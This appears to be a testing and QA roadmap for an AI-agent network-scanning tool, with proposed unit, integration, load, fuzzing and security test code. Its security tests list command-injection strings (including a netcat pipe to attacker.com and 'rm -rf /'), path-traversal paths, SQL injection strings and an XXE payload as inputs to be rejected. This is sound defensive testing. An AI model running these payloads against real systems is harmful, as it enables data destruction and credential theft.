# Testing and Quality Assurance

**Status**: HIGH PRIORITY - Essential for reliability

**Target Timeline**: Weeks 5-10 (Phase 2)

---

## Overview

Current test coverage is good but needs expansion to meet 90% target. Missing integration tests, performance tests, and comprehensive security testing.

### Priority: HIGH
**Effort**: Medium (4-5 weeks)
**Impact**: System reliability, bug prevention, regression protection

### Current State

```
Test Coverage Analysis:
✅ 80% overall coverage (good foundation)
✅ Unit tests for core functionality
❌ Integration tests limited
❌ No performance/load tests
❌ No security-specific tests
❌ Limited edge case coverage
```

---

## 1. Increase Unit Test Coverage to 90%

### Current State

**Coverage Report Analysis**:
```bash
pytest --cov=src --cov-report=term-missing
```

**Areas Needing Coverage**:
- ML algorithms edge cases
- Error handling paths
- Configuration validation
- Utility functions
- CLI argument parsing

### Implementation Details

#### 1.1 ML Algorithm Tests

**File**: `tests/test_ml/test_fuzzy_logic.py`

```python
"""Comprehensive tests for Fuzzy Logic algorithm."""

import pytest
from src.ml.fuzzy_logic import FuzzyLogicAgent

class TestFuzzyLogicAgent:
    """Test suite for Fuzzy Logic agent."""

    @pytest.fixture
    def agent(self):
        """Create agent instance for testing."""
        return FuzzyLogicAgent()

    def test_initialization(self, agent):
        """Test agent initializes correctly."""
        assert agent is not None
        assert hasattr(agent, 'rules')
        assert hasattr(agent, 'variables')

    def test_basic_inference(self, agent):
        """Test basic fuzzy inference."""
        inputs = {"risk": 0.7, "complexity": 0.5}
        result = agent.infer(inputs)

        assert "decision" in result
        assert "confidence" in result
        assert 0 <= result["confidence"] <= 1

    @pytest.mark.parametrize("risk,complexity,expected_action", [
        (0.9, 0.9, "deep_scan"),
        (0.3, 0.2, "quick_scan"),
        (0.5, 0.5, "normal_scan"),
        (0.0, 0.0, "skip"),
    ])
    def test_risk_assessment(self, agent, risk, complexity, expected_action):
        """Test risk-based decision making."""
        inputs = {"risk": risk, "complexity": complexity}
        result = agent.infer(inputs)

        assert result["decision"] == expected_action

    def test_invalid_inputs(self, agent):
        """Test handling of invalid inputs."""
        with pytest.raises(ValueError):
            agent.infer({"risk": -0.1})

        with pytest.raises(ValueError):
            agent.infer({"risk": 1.5})

        with pytest.raises(KeyError):
            agent.infer({})

    def test_edge_cases(self, agent):
        """Test boundary conditions."""
        # Test exact boundaries
        result = agent.infer({"risk": 0.0, "complexity": 0.0})
        assert result["confidence"] >= 0

        result = agent.infer({"risk": 1.0, "complexity": 1.0})
        assert result["confidence"] <= 1

    def test_rule_modification(self, agent):
        """Test dynamic rule updates."""
        original_rules = len(agent.rules)

        # Add custom rule
        agent.add_rule({
            "condition": "risk > 0.8 AND complexity < 0.3",
            "action": "targeted_scan"
        })

        assert len(agent.rules) == original_rules + 1

    @pytest.mark.asyncio
    async def test_concurrent_inference(self, agent):
        """Test thread safety of concurrent inferences."""
        import asyncio

        async def run_inference(inputs):
            return agent.infer(inputs)

        # Run multiple inferences concurrently
        tasks = [
            run_inference({"risk": 0.5, "complexity": 0.5})
            for _ in range(10)
        ]

        results = await asyncio.gather(*tasks)
        assert len(results) == 10
        assert all(r["confidence"] >= 0 for r in results)
```

#### 1.2 MCP Server Tests

**File**: `tests/test_mcp_servers/test_network_server.py`

```python
"""Comprehensive tests for Network MCP Server."""

import pytest
from unittest.mock import Mock, patch, AsyncMock
from src.mcp_servers.network_server import NetworkServer
from src.exceptions import ToolNotFoundError, ToolExecutionError

class TestNetworkServer:
    """Test suite for Network MCP Server."""

    @pytest.fixture
    async def server(self):
        """Create server instance."""
        server = NetworkServer()
        await server.initialize()
        return server

    @pytest.mark.asyncio
    async def test_nmap_scan_success(self, server):
        """Test successful nmap scan."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(
                returncode=0,
                stdout='{"host": "192.168.1.1", "ports": []}',
                stderr=''
            )

            result = await server.nmap_scan("192.168.1.1")

            assert result["host"] == "192.168.1.1"
            assert "ports" in result
            mock_run.assert_called_once()

    @pytest.mark.asyncio
    async def test_nmap_tool_not_found(self, server):
        """Test error when nmap not installed."""
        with patch('shutil.which', return_value=None):
            with pytest.raises(ToolNotFoundError) as exc_info:
                await server.nmap_scan("192.168.1.1")

            assert "nmap" in str(exc_info.value)
            assert exc_info.value.details["tool_name"] == "nmap"

    @pytest.mark.asyncio
    async def test_nmap_execution_failure(self, server):
        """Test nmap execution failure."""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.CalledProcessError(
                returncode=1,
                cmd="nmap",
                stderr="Error: Invalid target"
            )

            with pytest.raises(ToolExecutionError) as exc_info:
                await server.nmap_scan("invalid_target")

            assert exc_info.value.details["exit_code"] == 1

    @pytest.mark.parametrize("target,ports,expected_args", [
        ("192.168.1.1", "80,443", ["-p", "80,443"]),
        ("example.com", "1-1000", ["-p", "1-1000"]),
        ("10.0.0.1", None, []),
    ])
    @pytest.mark.asyncio
    async def test_nmap_port_specifications(
        self, server, target, ports, expected_args
    ):
        """Test various port specifications."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(
                returncode=0,
                stdout='{}',
                stderr=''
            )

            await server.nmap_scan(target, ports=ports)

            call_args = mock_run.call_args[0][0]
            for arg in expected_args:
                assert arg in call_args

    @pytest.mark.asyncio
    async def test_scan_timeout(self, server):
        """Test scan timeout handling."""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(
                cmd="nmap",
                timeout=30
            )

            with pytest.raises(ToolExecutionError):
                await server.nmap_scan("192.168.1.1", timeout=30)

    @pytest.mark.asyncio
    async def test_output_parsing(self, server):
        """Test nmap output parsing."""
        nmap_output = """
        {
            "host": "192.168.1.1",
            "ports": [
                {"port": 22, "state": "open", "service": "ssh"},
                {"port": 80, "state": "open", "service": "http"}
            ]
        }
        """

        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(
                returncode=0,
                stdout=nmap_output,
                stderr=''
            )

            result = await server.nmap_scan("192.168.1.1")

            assert len(result["ports"]) == 2
            assert result["ports"][0]["port"] == 22
            assert result["ports"][1]["service"] == "http"

    @pytest.mark.asyncio
    async def test_health_check(self, server):
        """Test server health check."""
        health = await server.health_check()

        assert health["status"] in ["healthy", "degraded", "unhealthy"]
        assert "tools" in health
        assert "nmap" in health["tools"]
```

#### 1.3 Supervisor Agent Tests

**File**: `tests/test_agents/test_supervisor.py`

```python
"""Comprehensive tests for Supervisor Agent."""

import pytest
from unittest.mock import Mock, AsyncMock, patch
from src.agents.supervisor import SupervisorAgent
from src.exceptions import OrchestrationError, InvalidTargetError

class TestSupervisorAgent:
    """Test suite for Supervisor Agent."""

    @pytest.fixture
    async def supervisor(self):
        """Create supervisor instance."""
        supervisor = SupervisorAgent()
        await supervisor.initialize()
        return supervisor

    @pytest.mark.asyncio
    async def test_orchestrate_simple_scan(self, supervisor):
        """Test basic scan orchestration."""
        target = {"host": "192.168.1.1", "port": None}

        result = await supervisor.orchestrate_scan(target)

        assert result.success is True
        assert len(result.responses) > 0
        assert result.total_time > 0

    @pytest.mark.asyncio
    async def test_agent_selection(self, supervisor):
        """Test ML-based agent selection."""
        # High-risk target should trigger more agents
        high_risk_target = {
            "host": "192.168.1.1",
            "port": 80,
            "protocol": "http"
        }

        result = await supervisor.orchestrate_scan(high_risk_target)
        high_risk_agents = len(result.responses)

        # Low-risk target should trigger fewer agents
        low_risk_target = {
            "host": "192.168.1.1",
            "port": 22,
            "protocol": "ssh"
        }

        result = await supervisor.orchestrate_scan(low_risk_target)
        low_risk_agents = len(result.responses)

        assert high_risk_agents >= low_risk_agents

    @pytest.mark.asyncio
    async def test_invalid_target(self, supervisor):
        """Test invalid target handling."""
        with pytest.raises(InvalidTargetError):
            await supervisor.orchestrate_scan({})

        with pytest.raises(InvalidTargetError):
            await supervisor.orchestrate_scan({"host": ""})

    @pytest.mark.asyncio
    async def test_agent_failure_handling(self, supervisor):
        """Test handling of agent failures."""
        # Mock one agent to fail
        with patch.object(
            supervisor.network_agent,
            'scan',
            side_effect=Exception("Agent failure")
        ):
            target = {"host": "192.168.1.1"}
            result = await supervisor.orchestrate_scan(target)

            # Orchestration should continue with other agents
            assert result.success is True
            assert any(r["status"] == "error" for r in result.responses)

    @pytest.mark.asyncio
    async def test_concurrent_scans(self, supervisor):
        """Test multiple concurrent scans."""
        targets = [
            {"host": f"192.168.1.{i}"}
            for i in range(1, 6)
        ]

        tasks = [
            supervisor.orchestrate_scan(target)
            for target in targets
        ]

        results = await asyncio.gather(*tasks)

        assert len(results) == 5
        assert all(r.success for r in results)

    @pytest.mark.asyncio
    async def test_ml_algorithm_selection(self, supervisor):
        """Test ML algorithm selection logic."""
        # Test different scenarios trigger different algorithms
        scenarios = [
            {"complexity": "low", "expected_algo": "fuzzy_logic"},
            {"complexity": "medium", "expected_algo": "genetic_algorithm"},
            {"complexity": "high", "expected_algo": "qlearning"},
        ]

        for scenario in scenarios:
            algo = supervisor.select_ml_algorithm(scenario["complexity"])
            assert algo == scenario["expected_algo"]
```

### Acceptance Criteria
- [ ] Overall test coverage ≥ 90%
- [ ] All ML algorithms have comprehensive tests
- [ ] All MCP servers have full test coverage
- [ ] Edge cases covered
- [ ] Error paths tested
- [ ] Async code tested properly

**Effort Estimate**: 2 weeks

---

## 2. Integration Testing

### Current State

```
❌ Limited integration tests
❌ No end-to-end test scenarios
❌ MCP server integration not tested
```

### Implementation Details

#### 2.1 MCP Server Integration Tests

**File**: `tests/integration/test_mcp_integration.py`

```python
"""Integration tests for MCP servers."""

import pytest
import docker
from testcontainers.core.container import DockerContainer

@pytest.fixture(scope="module")
def kali_container():
    """Start Kali Linux container for integration tests."""
    client = docker.from_env()

    # Build container with tools
    container = client.containers.run(
        "kalilinux/kali-rolling",
        command="sleep infinity",
        detach=True,
        remove=True
    )

    # Install required tools
    container.exec_run("apt-get update")
    container.exec_run("apt-get install -y nmap masscan gobuster nikto")

    yield container

    container.stop()

@pytest.mark.integration
@pytest.mark.asyncio
async def test_network_scan_integration(kali_container):
    """Test full network scan workflow."""
    from src.mcp_servers.network_server import NetworkServer

    server = NetworkServer()
    await server.initialize()

    # Execute real nmap scan
    result = await server.nmap_scan(
        target="scanme.nmap.org",
        ports="80,443"
    )

    assert result["host"] == "scanme.nmap.org"
    assert len(result["ports"]) >= 0
    assert result["scan_time"] > 0

@pytest.mark.integration
@pytest.mark.asyncio
async def test_supervisor_full_workflow(kali_container):
    """Test complete supervisor orchestration."""
    from src.agents.supervisor import SupervisorAgent

    supervisor = SupervisorAgent()
    await supervisor.initialize()

    # Run full scan
    target = {"host": "scanme.nmap.org"}
    result = await supervisor.orchestrate_scan(target)

    assert result.success is True
    assert len(result.responses) >= 2
    assert result.summary is not None
```

#### 2.2 End-to-End CLI Tests

**File**: `tests/integration/test_cli_e2e.py`

```python
"""End-to-end CLI tests."""

import pytest
import subprocess
from pathlib import Path

@pytest.mark.e2e
def test_cli_scan_command():
    """Test full CLI scan command."""
    result = subprocess.run(
        ["python", "-m", "src.cli.main", "scan", "scanme.nmap.org"],
        capture_output=True,
        text=True,
        timeout=120
    )

    assert result.returncode == 0
    assert "Scan completed" in result.stdout

@pytest.mark.e2e
def test_cli_report_generation():
    """Test report generation from CLI."""
    # First run scan
    scan_result = subprocess.run(
        ["python", "-m", "src.cli.main", "scan", "scanme.nmap.org"],
        capture_output=True,
        text=True
    )

    assert scan_result.returncode == 0

    # Then generate report
    report_result = subprocess.run(
        ["python", "-m", "src.cli.main", "report", "--format", "pdf"],
        capture_output=True,
        text=True
    )

    assert report_result.returncode == 0
    assert Path("report.pdf").exists()

@pytest.mark.e2e
def test_cli_agent_list():
    """Test listing available agents."""
    result = subprocess.run(
        ["python", "-m", "src.cli.main", "agents", "list"],
        capture_output=True,
        text=True
    )

    assert result.returncode == 0
    assert "network" in result.stdout.lower()
    assert "web" in result.stdout.lower()
```

#### 2.3 Database Integration Tests

**File**: `tests/integration/test_data_persistence.py`

```python
"""Test data persistence and retrieval."""

import pytest
from src.mcp_servers.data_server import DataServer

@pytest.mark.integration
@pytest.mark.asyncio
async def test_scan_result_storage():
    """Test storing and retrieving scan results."""
    data_server = DataServer()

    # Store scan result
    scan_data = {
        "target": "192.168.1.1",
        "timestamp": "2024-01-01T00:00:00",
        "results": {"ports": [80, 443]}
    }

    scan_id = await data_server.store_scan(scan_data)
    assert scan_id is not None

    # Retrieve scan result
    retrieved = await data_server.get_scan(scan_id)
    assert retrieved["target"] == scan_data["target"]
    assert retrieved["results"] == scan_data["results"]

@pytest.mark.integration
@pytest.mark.asyncio
async def test_scan_history():
    """Test scan history retrieval."""
    data_server = DataServer()

    # Store multiple scans
    for i in range(5):
        await data_server.store_scan({
            "target": f"192.168.1.{i}",
            "timestamp": f"2024-01-0{i+1}T00:00:00",
            "results": {}
        })

    # Get history
    history = await data_server.get_scan_history(limit=10)
    assert len(history) >= 5
```

### Acceptance Criteria
- [ ] Integration tests for all MCP servers
- [ ] End-to-end CLI tests
- [ ] Database integration tests
- [ ] Docker container tests
- [ ] Test data fixtures created
- [ ] Integration tests run in CI

**Effort Estimate**: 1.5 weeks

---

## 3. Performance and Load Testing

### Current State

```
❌ No performance benchmarks
❌ No load testing
❌ No profiling
```

### Implementation Details

#### 3.1 Performance Benchmarks

**File**: `tests/performance/test_benchmarks.py`

```python
"""Performance benchmarks."""

import pytest
import time
from src.agents.supervisor import SupervisorAgent

@pytest.mark.benchmark
@pytest.mark.asyncio
async def test_scan_performance(benchmark):
    """Benchmark single scan performance."""
    supervisor = SupervisorAgent()

    async def run_scan():
        return await supervisor.orchestrate_scan({"host": "127.0.0.1"})

    # Benchmark expects sync function
    result = benchmark(lambda: asyncio.run(run_scan()))

    # Assert performance requirements
    assert benchmark.stats.mean < 5.0  # Mean < 5 seconds

@pytest.mark.benchmark
def test_ml_algorithm_performance(benchmark):
    """Benchmark ML algorithm inference speed."""
    from src.ml.fuzzy_logic import FuzzyLogicAgent

    agent = FuzzyLogicAgent()
    inputs = {"risk": 0.7, "complexity": 0.5}

    result = benchmark(agent.infer, inputs)

    # ML inference should be fast
    assert benchmark.stats.mean < 0.1  # Mean < 100ms
```

#### 3.2 Load Testing

**File**: `tests/performance/test_load.py`

```python
"""Load tests using locust."""

from locust import HttpUser, task, between

class MCPServerLoadTest(HttpUser):
    """Load test for MCP servers."""
    wait_time = between(1, 3)

    @task(3)
    def network_scan(self):
        """Test network scan endpoint."""
        self.client.post("/network/scan", json={
            "target": "192.168.1.1",
            "ports": "80,443"
        })

    @task(2)
    def web_scan(self):
        """Test web scan endpoint."""
        self.client.post("/web/scan", json={
            "target": "http://example.com"
        })

    @task(1)
    def get_results(self):
        """Test results endpoint."""
        self.client.get("/data/scans/recent")
```

**Run load tests**:
```bash
locust -f tests/performance/test_load.py --host=http://localhost:8000
```

#### 3.3 Profiling

**File**: `tests/performance/profile_scan.py`

```python
"""Profile scan performance."""

import cProfile
import pstats
from src.agents.supervisor import SupervisorAgent

async def profile_scan():
    """Profile a complete scan."""
    supervisor = SupervisorAgent()
    await supervisor.orchestrate_scan({"host": "192.168.1.1"})

if __name__ == "__main__":
    profiler = cProfile.Profile()
    profiler.enable()

    import asyncio
    asyncio.run(profile_scan())

    profiler.disable()
    stats = pstats.Stats(profiler)
    stats.sort_stats('cumulative')
    stats.print_stats(20)
```

### Acceptance Criteria
- [ ] Performance benchmarks for critical paths
- [ ] Load tests for concurrent scans
- [ ] Profiling identifies bottlenecks
- [ ] Performance requirements documented
- [ ] Performance regression tests in CI

**Effort Estimate**: 1 week

---

## 4. Security Testing

### Current State

```
✅ Bandit, Safety, Semgrep in CI
❌ No penetration testing of API
❌ No fuzzing tests
❌ No security-specific test scenarios
```

### Implementation Details

#### 4.1 Security Test Suite

**File**: `tests/security/test_input_validation.py`

```python
"""Security tests for input validation."""

import pytest
from src.mcp_servers.network_server import NetworkServer
from src.exceptions import InvalidTargetError

@pytest.mark.security
@pytest.mark.asyncio
async def test_command_injection_prevention():
    """Test command injection prevention."""
    server = NetworkServer()

    # Attempt command injection
    malicious_targets = [
        "192.168.1.1; rm -rf /",
        "192.168.1.1 && cat /etc/passwd",
        "192.168.1.1 | nc attacker.com 4444",
        "192.168.1.1 `whoami`",
        "192.168.1.1 $(whoami)",
    ]

    for target in malicious_targets:
        with pytest.raises((InvalidTargetError, ValueError)):
            await server.nmap_scan(target)

@pytest.mark.security
@pytest.mark.asyncio
async def test_path_traversal_prevention():
    """Test path traversal prevention."""
    from src.mcp_servers.report_server import ReportServer

    server = ReportServer()

    # Attempt path traversal
    malicious_paths = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
    ]

    for path in malicious_paths:
        with pytest.raises((ValueError, PermissionError)):
            await server.load_template(path)

@pytest.mark.security
def test_sql_injection_prevention():
    """Test SQL injection prevention."""
    from src.mcp_servers.data_server import DataServer

    server = DataServer()

    # Attempt SQL injection
    malicious_queries = [
        "1' OR '1'='1",
        "'; DROP TABLE scans; --",
        "1 UNION SELECT * FROM users",
    ]

    for query in malicious_queries:
        # Should not raise exception but should sanitize
        result = server.search_scans(query)
        assert result is not None

@pytest.mark.security
@pytest.mark.asyncio
async def test_xxe_prevention():
    """Test XXE attack prevention."""
    from src.mcp_servers.report_server import ReportServer

    server = ReportServer()

    # Attempt XXE
    malicious_xml = """
    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <report>&xxe;</report>
    """

    with pytest.raises((ValueError, Exception)):
        await server.parse_xml_report(malicious_xml)
```

#### 4.2 Fuzzing Tests

**File**: `tests/security/test_fuzzing.py`

```python
"""Fuzzing tests using hypothesis."""

import pytest
from hypothesis import given, strategies as st
from src.mcp_servers.network_server import NetworkServer

@pytest.mark.security
@given(target=st.text(min_size=1, max_size=1000))
@pytest.mark.asyncio
async def test_fuzz_nmap_target(target):
    """Fuzz nmap target parameter."""
    server = NetworkServer()

    try:
        await server.nmap_scan(target)
    except (InvalidTargetError, ValueError):
        # Expected for invalid inputs
        pass
    except Exception as e:
        # Unexpected errors should be reported
        pytest.fail(f"Unexpected error for input '{target}': {e}")

@given(
    data=st.dictionaries(
        keys=st.text(min_size=1, max_size=50),
        values=st.one_of(
            st.text(),
            st.integers(),
            st.floats(allow_nan=False),
            st.lists(st.text())
        )
    )
)
@pytest.mark.security
def test_fuzz_config_validation(data):
    """Fuzz configuration validation."""
    from src.config.schema import AppConfig

    try:
        AppConfig(**data)
    except (ValueError, TypeError):
        # Expected for invalid configs
        pass
```

#### 4.3 API Security Tests

**File**: `tests/security/test_api_security.py`

```python
"""API security tests."""

import pytest
from fastapi.testclient import TestClient
from src.api.main import app

client = TestClient(app)

@pytest.mark.security
def test_rate_limiting():
    """Test API rate limiting."""
    # Send multiple requests quickly
    responses = []
    for _ in range(100):
        response = client.post("/network/scan", json={
            "target": "192.168.1.1"
        })
        responses.append(response)

    # Should get rate limited
    assert any(r.status_code == 429 for r in responses)

@pytest.mark.security
def test_authentication_required():
    """Test authentication enforcement."""
    response = client.get("/admin/config")
    assert response.status_code == 401

@pytest.mark.security
def test_cors_headers():
    """Test CORS configuration."""
    response = client.options("/network/scan", headers={
        "Origin": "http://malicious.com"
    })

    # Should not allow arbitrary origins
    assert "Access-Control-Allow-Origin" not in response.headers or \
           response.headers["Access-Control-Allow-Origin"] != "*"
```

### Acceptance Criteria
- [ ] Input validation tests for all endpoints
- [ ] Command injection prevention tests
- [ ] Path traversal prevention tests
- [ ] SQL injection prevention tests
- [ ] Fuzzing tests for critical functions
- [ ] API security tests (rate limiting, auth)
- [ ] Security test suite runs in CI

**Effort Estimate**: 1 week

---

## 5. Test Infrastructure

### Implementation Details

#### 5.1 Test Data Fixtures

**File**: `tests/fixtures/scan_data.py`

```python
"""Shared test fixtures for scan data."""

import pytest
from pathlib import Path

@pytest.fixture
def sample_nmap_output():
    """Sample nmap XML output."""
    return Path("tests/fixtures/data/nmap_sample.xml").read_text()

@pytest.fixture
def sample_scan_result():
    """Sample complete scan result."""
    return {
        "target": "192.168.1.1",
        "timestamp": "2024-01-01T00:00:00",
        "ports": [
            {"port": 22, "state": "open", "service": "ssh"},
            {"port": 80, "state": "open", "service": "http"},
        ],
        "vulnerabilities": []
    }

@pytest.fixture
def mock_ml_agent(mocker):
    """Mock ML agent for testing."""
    agent = mocker.Mock()
    agent.infer.return_value = {
        "decision": "normal_scan",
        "confidence": 0.8
    }
    return agent
```

#### 5.2 Test Configuration

**File**: `pytest.ini`

```ini
[pytest]
minversion = 8.0
addopts =
    -ra
    --strict-markers
    --strict-config
    --cov=src
    --cov-report=html
    --cov-report=term-missing:skip-covered
    --cov-branch
testpaths = tests
markers =
    unit: Unit tests
    integration: Integration tests
    e2e: End-to-end tests
    security: Security tests
    performance: Performance tests
    benchmark: Benchmark tests
    slow: Slow tests (deselect with '-m "not slow"')
asyncio_mode = auto
```

#### 5.3 CI Test Matrix

**File**: `.github/workflows/tests.yml`

```yaml
strategy:
  matrix:
    python-version: ['3.10', '3.11', '3.12']
    os: [ubuntu-latest, windows-latest, macos-latest]
    test-type: [unit, integration, security]
  fail-fast: false

steps:
  - name: Run Tests
    run: |
      if [ "${{ matrix.test-type }}" == "unit" ]; then
        pytest -m "unit" --cov=src --cov-report=xml
      elif [ "${{ matrix.test-type }}" == "integration" ]; then
        pytest -m "integration" --timeout=300
      elif [ "${{ matrix.test-type }}" == "security" ]; then
        pytest -m "security"
      fi

  - name: Upload Coverage
    uses: codecov/codecov-action@v4
    with:
      file: ./coverage.xml
```

### Acceptance Criteria
- [ ] Comprehensive test fixtures
- [ ] Test configuration optimized
- [ ] CI test matrix for multiple versions
- [ ] Test reports generated
- [ ] Coverage reports uploaded

**Effort Estimate**: 3-4 days

---

## Related Issues

- GitHub issues with label `testing`
- Milestone: Phase 2 - Quality Assurance

---

## Success Metrics

### Coverage Metrics
- [ ] Overall coverage ≥ 90%
- [ ] Unit test coverage ≥ 95%
- [ ] Integration test coverage ≥ 80%
- [ ] Branch coverage ≥ 85%

### Performance Metrics
- [ ] Single scan < 5 seconds
- [ ] ML inference < 100ms
- [ ] API response time < 1 second
- [ ] Support 10 concurrent scans

### Security Metrics
- [ ] All input validation tested
- [ ] No security scanner failures
- [ ] Fuzzing tests pass
- [ ] API security tests pass

**Total Effort Estimate**: 4-5 weeks
